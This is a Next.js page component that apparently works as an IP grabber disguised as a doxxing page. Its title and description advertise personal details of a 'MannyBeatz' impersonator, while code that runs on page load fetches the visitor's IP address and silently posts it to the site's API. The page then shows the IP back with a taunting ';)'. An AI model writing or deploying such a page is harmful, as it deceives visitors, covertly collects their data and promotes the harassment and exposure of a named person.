import type { NextPage } from 'next'
import Head from 'next/head'
import { useEffect, useState } from 'react'
import styles from '../styles/Home.module.css'

const Home: NextPage = () => {
  const [isLoading, setLoading] = useState(false);
  const [IP, setIP] = useState("")

  const getIp = async () => {
    const res = await fetch('https://icanhazip.com/')
    return res.text()
  }

  const sendIp = async (address: string) => {
    fetch('api/hello', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ ip: address })
    })
  }

  useEffect(() => {
    setLoading(true)
    getIp()
      .then(ip => {
        setIP(ip)
        sendIp(ip)
      })
      .finally(() => setLoading(false))
  }, [])

  return (
    <div className={styles.container}>
      <Head>
        <title>"MannyBeatz" Impersonator Doxx</title>
        <meta name="description" content="Immy Doxxed for impersonating MannyBeatz includes address, phone number, real name, and partial employment inforamtion" />
        <meta property="og:image" content="https://cdn.discordapp.com/attachments/971514890432954398/972285109673803856/BB872448-5EF0-424A-BDCD-895D2163EDD2.jpg" />
      </Head>
      {isLoading ? <div className={styles.loader}>Loading...</div> : <h1>Your IP is: {IP} ;)</h1>}
    </div>
  )
}

export default Home
